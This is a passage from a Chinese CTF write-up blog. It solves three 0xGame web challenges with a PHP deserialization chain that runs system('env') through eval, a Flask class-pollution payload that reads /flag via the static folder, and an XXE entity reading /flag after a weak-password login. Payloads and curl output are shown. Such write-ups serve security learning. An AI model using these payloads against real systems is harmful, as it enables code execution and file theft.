class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Rubbish_Unser&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">链子挺清晰的</span><br><span class="line">ZZZ::<span class="variable constant_">__destruct</span> → __toString→ <span class="title class_">Mi</span>::<span class="variable constant_">__toString</span> → GI::<span class="title function_ invoke__">__call</span>()→ <span class="title class_">HI3rd</span>::<span class="variable constant_">__invoke</span> → HSR::<span class="title function_ invoke__">__get</span>() → <span class="keyword">eval</span></span><br></pre></td></tr></table></figure>

<p>md5和sha1分别相等   a&#x3D;1 b&#x3D;’1’</p>
<p>然后就是<code>throw new Exception(&quot;Rubbish_Unser&quot;)</code>，利用php的gc回收机制</p>
<p>在php中，当对象被销毁时会自动调用__destruct()方法，但如果程序报错或者抛出异常，就不会触发该魔术方法。</p>
<p>当一个类创建之后它会自己消失，而 __destruct() 魔术方法的触发条件就是一个类被销毁时触发，而throw那个函数就是回收了自动销毁的类，导致destruct检测不到有东西销毁，从而也就导致无法触发destruct函数。</p>
<p>我们可以通过提前触发垃圾回收机制来抛出异常，从而绕过GC回收，唤醒__destruct()魔术方法。</p>
<p>触发gc回收机制：1.对象被unset()处理   2.数组对象为NULL</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">可构造</span><br><span class="line">可构造</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">ZZZ</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$yuzuha</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">HSR</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$robin</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">HI3rd</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$guanxing</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">GI</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$furina</span>;  </span><br><span class="line">&#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Mi</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$game</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">HSR</span>();</span><br><span class="line"> <span class="variable">$a</span>-&gt;robin = <span class="string">&quot;system(&#x27;env&#x27;);&quot;</span>;</span><br><span class="line"> <span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">HI3rd</span>();</span><br><span class="line"></span><br><span class="line"> <span class="variable">$b</span>-&gt;kiana=<span class="number">1</span>;</span><br><span class="line"> <span class="variable">$b</span>-&gt;RaidenMei=<span class="string">&#x27;1&#x27;</span>;   <span class="comment">//比较</span></span><br><span class="line"></span><br><span class="line"> <span class="variable">$b</span> -&gt; guanxing = <span class="variable">$a</span>;</span><br><span class="line"> <span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">GI</span>();</span><br><span class="line"> <span class="variable">$c</span> -&gt; furina = <span class="variable">$b</span>;</span><br><span class="line"> <span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Mi</span>();</span><br><span class="line"> <span class="variable">$d</span> -&gt; game = <span class="variable">$c</span>;</span><br><span class="line"> <span class="variable">$e</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ZZZ</span>();</span><br><span class="line"> <span class="variable">$e</span> -&gt; yuzuha = <span class="variable">$d</span>;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$A</span> = <span class="keyword">array</span>(<span class="variable">$e</span>,<span class="number">0</span>); <span class="comment">//gc</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$A</span>));</span><br></pre></td></tr></table></figure>

<p>‍</p>
<h2 id="Lemon-RevEnge-复现"><a href="#Lemon-RevEnge-复现" class="headerlink" title="Lemon_RevEnge(复现"></a>Lemon_RevEnge(复现</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">源码</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dst</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Game0x = Dst()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), Game0x)  <span class="comment">#看到merge差不多就原型链污染了</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, Game0x=Game0x)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Not Found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">9000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用的是这个师傅<a href="https://normalsubgroup.cauchy.top/blog/game0x2025w1/">https://normalsubgroup.cauchy.top/blog/game0x2025w1/</a> 的payload</p>
<p>从静态路由读取任意文件</p>
<p>​<code>{&quot;__init__&quot;:{&quot;__globals__&quot;:{&quot;app&quot;:{&quot;static_folder&quot;:&quot;/proc/1/root&quot;}}}}</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali1㉿kali)-[~]</span><br><span class="line">└─$ curl -s -X POST &quot;http://nc1.ctfplus.cn:31200/&quot; -H &#x27;Content-Type: application/json&#x27; \  --data &#x27;&#123;&quot;__init__&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;app&quot;:&#123;&quot;static_folder&quot;:&quot;/proc/1/root&quot;&#125;&#125;&#125;&#125;&#x27;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;WAWAWA&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;flag 其实就在 /flag 里，但是为什么拿不到呢？&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;如果欢与歌 跟酸与涩 都只是梦一重&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;也许我 仍会选择 某个仲夏 再跟你重逢&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;直到找回你 赠予我的 被遗落的 珍奇&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;让所有 闪光的回忆 不再被时间风化&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;人越珍视的 越无价的 幸福越难长留&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;只有你 提醒了我 那是圆缺 不是所有&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;我总藏匿起 如柠檬般 最酸涩的念头&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;但是你 总是能带我找到 沉默的出口&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;我想我们终将知道 世上每个人都需要&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;让自己变得更加快乐 那件礼物&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;那一天的忧郁 忧郁起来&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;那一天的寂寞 寂寞起来&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;连同着迷这个 炎炎夏日 万般滋味 那个你&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;都化作了烙印 在我心底&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;挥之不去的柠檬气息&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;在晴朗驱散大雨之前都 无法被抹去&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;如同嚼下一口柠檬那样 让我难忘记&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;你是我永远驻足眺望的 唯一那束光&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;                                                                             </span><br><span class="line">┌──(kali1㉿kali)-[~]</span><br><span class="line">└─$ curl -s &quot;http://nc1.ctfplus.cn:31200/static/flag&quot;</span><br><span class="line">0xGame&#123;Welcome_to_Easy_Pollute~&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>官方wp是这个<code>{ &quot;__init__&quot;:{&quot;__globals__&quot;:{&quot;os&quot;:{&quot;path&quot;:{&quot;pardir&quot;:&quot;,&quot;}}}}}</code>然后目录穿越，但我没读出来flag</p>
<p>‍</p>
<h2 id="留言板（粉）"><a href="#留言板（粉）" class="headerlink" title="留言板（粉）"></a>留言板（粉）</h2><p>打开啥玩意没有，dirsearch扫一下，扫到了个登录页</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[19:21:37] 200 -  213B  - /Dockerfile                                       </span><br><span class="line">[19:21:37] 200 -   83B  - /docker-compose.yml                               </span><br><span class="line">[19:21:45] 200 -    2KB - /login.php</span><br><span class="line">[19:21:53] 200 -    2B  - /ping</span><br></pre></td></tr></table></figure>

<p>登入账号密码是admin&#x2F;admin123  （弱密码爆破）</p>
<p>登入后，明显是xxe</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE x [</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;php://filter/resource=/flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;msg&gt;&amp;xxe;&lt;/msg&gt;</span><br><span class="line">直接读出来了</span><br></pre></td></tr></table></figure>

<p>‍</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
</search>
